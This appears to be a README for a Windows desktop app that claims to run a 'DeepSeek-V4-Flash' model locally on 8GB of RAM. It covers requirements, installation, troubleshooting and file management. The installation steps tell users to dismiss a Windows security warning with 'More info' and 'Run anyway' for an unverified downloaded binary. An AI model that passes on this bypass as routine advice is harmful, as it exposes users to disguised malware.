## 📌 Project Overview

This software allows you to run the DeepSeek-V4-Flash model on your hardware. You do not need experience with command lines or coding to use this tool. We package the model so it works on standard Windows machines. The software manages the heavy lifting for you. You gain access to advanced artificial intelligence right on your local machine without sending data to a cloud server.

## 💻 System Requirements

Your computer needs specific hardware to run this model. Please confirm your machine meets these marks before you begin:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Processor**: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
*   **Memory**: At least 8GB of RAM.
*   **Storage**: 5GB of free space on your hard drive to hold the model files.
*   **Graphics**: A dedicated graphics card helps performance, but the software functions using the main processor if necessary.

## ⚙️ Installation Process

Installing the software is straightforward. 

1. Locate the file you downloaded. 
2. Double-click the file to start the installer.
3. Windows might show a security window. Click "More info" and then "Run anyway" if the system asks. This happens because the app is brand new.
4. Follow the steps on your screen. The wizard asks where you want to store the files. The default folder usually works best.
5. Click "Finish" when the progress bar reaches the end.

## 🚀 Running the Application

Once installation completes, you can start the program.

1. Find the new shortcut on your desktop named "flash-pi-dsv4".
2. Double-click the shortcut.
3. A black window appears for a moment. This is the background controller preparing the model. Wait for the main window to open.
4. The application main screen shows a text box. You can type your questions or prompts here.
5. Press the "Enter" key on your keyboard to send your prompt to the model.

## 🛠 Solving Common Issues

If you encounter problems, check these solutions:

*   **App fails to launch**: Make sure you installed the latest Windows updates. Older versions of Windows might lack the security features required to run the model interface.
*   **Slow response times**: Running large models takes significant power. Close your web browser and other heavy apps while you use the software to free up your memory.
*   **Errors in the text box**: These usually mean the memory limit of your computer is reached. Restart the application to clear the memory buffer.
*   **No output appears**: Give the process a moment. The system needs to load the model into your RAM the first time you ask a question. This can take thirty seconds on older hardware.

## 🔍 Understanding the Model

The software uses a compressed version of the DeepSeek-V4 technology. We optimized this specifically for hardware with 8GB of RAM. It keeps your input private because the model operates entirely on your machine. No information leaves your home network. You can disconnect your internet once the application starts, and it remains fully functional.

## 📁 Managing Model Files

The software stores model data in your user profile folder. If you ever need to delete the model to save space, navigate to `C:\Users\[YourName]\AppData\Local\flash-pi-dsv4` and remove the contents. Do not delete the application itself unless you intend to uninstall it. Reinstalling the application replaces these files if you ever experience a corrupted download.

## 💡 Using the Interface

The interface stays simple by design. You have a chat input at the bottom and a history view in the center. Use the "Clear" button in the menu bar to reset the chat session. This flushes the current conversation from your memory and allows you to start a fresh topic. Settings remain under the "Edit" menu, though you should not need to change these for normal use.
